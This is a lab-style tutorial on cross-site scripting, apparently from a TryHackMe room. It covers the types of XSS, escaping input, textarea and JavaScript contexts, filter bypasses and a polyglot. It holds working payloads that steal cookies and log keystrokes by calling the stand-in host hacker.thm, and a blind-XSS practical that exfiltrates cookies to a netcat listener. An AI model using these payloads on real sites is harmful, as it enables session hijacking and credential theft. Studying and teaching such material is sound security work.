# Intro to Cross-site Scripting (XSS)
**Cross-site Scripting (XSS)** is an **injection attack** where malicious JavaScript is injected into a web application to be executed by other users.

## XSS Payload
In XSS, the **payload** is the JavaScript code to be executed, consisting of:

- **Intention:** Desired action (e.g., alert, steal cookie)
- **Modification:** Adjustments made for execution

## Types of intentions in XSS Payloads
XSS Payload can be implemented with various different objectives and intentions. Below are a few types listed:

### Proof of Concept
This is the simplest of payloads which demonstrates that XSS can be acheived on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:

```html
<script>alert('XSS');</script>
```

### Session Stealing
- Details of a user's session, such as login tokens, are often kept in cookies on the targets machine.
- The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged.
- Once the hacker has these cookies, they can take over the target's session and be logged as that user.

```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

### Key Logger
The code below acts as a key logger where anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

```html
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

### Business Logic Attack
- This payload works by calling a particular network resource or a JavaScript function.
- For example, the JavaScript function, user.changeEmail() changes the user's email address. Thus, the payload could look like this:

```html
<script>user.changeEmail('attacker@hacker.thm');</script>
```

## Types of XSS

### 1. Reflected XSS
- Reflected user input is included in web page output without validation.
- Test vectors:
  - URL parameters
  - File paths
  - HTTP headers (rare)
- **Impact:** Session hijacking, data leakage

![image](https://github.com/user-attachments/assets/61dda173-fbc8-418f-870a-3921681607d2)

### 2. Stored XSS
- Malicious payload is stored in a backend database and shown to users.
- Test points:
  - Blog comments
  - Profile information
  - Form inputs (e.g., age field manipulation)

![image](https://github.com/user-attachments/assets/5c442828-9bc9-48b6-a7ea-a4e84932144a)

### 3. Document Object Model (DOM)-Based XSS
- JavaScript in the browser processes attacker-controlled input (e.g., `window.location.hash`).
- **Impact:** Redirects, cookie theft
- Look for use of:
  - `eval()`
  - Direct DOM insertion

### Blind XSS
- Blind XSS is similar to a stored XSS in which the payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

#### Example
- A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.
- By using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.

#### Testing Blind XSS
- The testing of Blind XSS vulnerabilities requires the payload to have a call back (usually an HTTP request). This way, you know if and when your code is being executed.
- Popular tools used for Blind XSS would be **Hunter Express** which will automatically capture cookies, URLs, page contents and more.

## XSS Payload Demonstration

### Example 1
You're presented with a form asking you to enter your name, and once you've entered your name, it will be presented on a line below, for example:

![image](https://github.com/user-attachments/assets/2419ad2f-0406-45f5-af9d-62f703ea77a0)

If you view the Page Source, You'll see your name reflected in the code:

![image](https://github.com/user-attachments/assets/45cf24d9-2b95-4c4a-8a50-27c5e77faa41)

Instead of entering your name, we're instead going to try entering the following JavaScript Payload: 

```html
<script>alert('THM');</script>
```

Now when you click the enter button, you'll get an alert popup with the string THM and the page source will look like the following:

![image](https://github.com/user-attachments/assets/bc14fbfd-8236-402d-838d-a6f408e615c3)

### Example 2
Like the previous level, you're being asked again to enter your name. This time when clicking enter, your name is being reflected in an input tag instead:

![image](https://github.com/user-attachments/assets/b1b810de-9c1c-49f8-a1ed-260b27e4ebf9)

Viewing the page source, you can see your name reflected inside the value attribute of the input tag:

![image](https://github.com/user-attachments/assets/517d8fb4-a7f4-4365-b82f-f95c59c991f7)

The previous JavaScript payload won't work because you can't run it from inside the input tag. We need to escape the input tag first so the payload can run properly, which can be done through the following payload:

The important part of the payload is the **">** which closes the value parameter and then closes the input tag. This now closes the input tag properly and allows the JavaScript payload to run.

```html
"><script>alert('THM');</script>
```

### Example 3
You're presented with another form asking for your name, and the same as the previous level, your name gets reflected inside an HTML tag, but this time through the textarea tag.

![image](https://github.com/user-attachments/assets/a561d252-5476-42d6-bf48-980ad2981bc3)

![image](https://github.com/user-attachments/assets/3a089226-6aa1-4f44-8238-546551764b74)

As a result, we need to escape the textarea tag a little differently from the input one (in Level Two) by using the following payload: 

```html
</textarea><script>alert('THM');</script>
```

The important part of the above payload is **</textarea>**, which closes the textarea element so the script will run.

![image](https://github.com/user-attachments/assets/a79e0c92-41f7-401f-bce0-16873de04dd1)


### Example 4
Entering your name into the form, you'll see it reflected on the page. This level looks similar to example one, but upon inspecting the page source, you'll see your name gets reflected in some JavaScript code.

![image](https://github.com/user-attachments/assets/5bbf4491-304b-4296-b917-7f4dba14f16f)

You'll have to escape the existing JavaScript command to run your code; you can do this with the following payload 

```html
';alert('THM');// 
```

The ' closes the field specifying the name, then ; signifies the end of the current command, and the // at the end makes anything after it a comment rather than executable code.

![image](https://github.com/user-attachments/assets/16674925-e1df-451d-80b1-5e242d8752e7)

Now when you click the enter button, you'll get an alert popup with the string THM.



### Example 5 (bypass filter)
```html
<sscriptcript>alert('THM');</sscriptcript>
```

### Example 6 (attribute injection)
```html
/images/cat.jpg" onload="alert('THM');
```

## Polyglot Payload
An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. The below polyglot could be utilized on all six examples to execute the code and yield the same results.

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

## Blind XSS Practical Example: Extracting User's cookie

### Setting up a listening server to receive the information through Netcat
- Some helpful information to be extracted from another user would be their cookies, which we could use to elevate our privileges by hijacking their login session.
- To do this, our payload will need to extract the user's cookie and exfiltrate it to another webserver server of our choice. Firstly, we'll need to set up a listening server to receive the information and this can be done by using Netcat.

In the following example, we want to listen on port 9001 so we issue the command nc -l -p 9001. 

- -l option indicates that we want to use Netcat in listen mode
- -p option is used to specify the port number. In this case, we want to listen on port 9001
- -n option is used to avoid the resolution of hostnames via DNS and discover any errors
- -v option runs Netcat in verbose mode.

Note: The final command becomes nc -n -l -v -p 9001, equivalent to nc -nlvp 9001.

```bash
nc -nlvp 9001
```

### Setting up the Payload to Exfiltrate Cookies
Now that we’ve set up the method of receiving the exfiltrated information, let’s build the payload.

- The </textarea> tag closes the text area field.
- The <script> tag opens an area for us to write JavaScript.
- The fetch() command makes an HTTP request.
- URL_OR_IP is either the THM request catcher URL, your IP address from the THM AttackBox, or your IP address on the THM VPN Network.
- PORT_NUMBER is the port number you are using to listen for connections on the AttackBox.
- ?cookie= is the query string containing the victim’s cookies.
- btoa() command base64 encodes the victim’s cookies.
- document.cookie accesses the victim’s cookies for the Acme IT Support Website.
- </script>closes the JavaScript code block.

```html
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie));</script>
```

### Decoding the cookie values
Once we have obtained the staff-session cookie, we can decode it using Base64 decoder
https://www.base64decode.org/
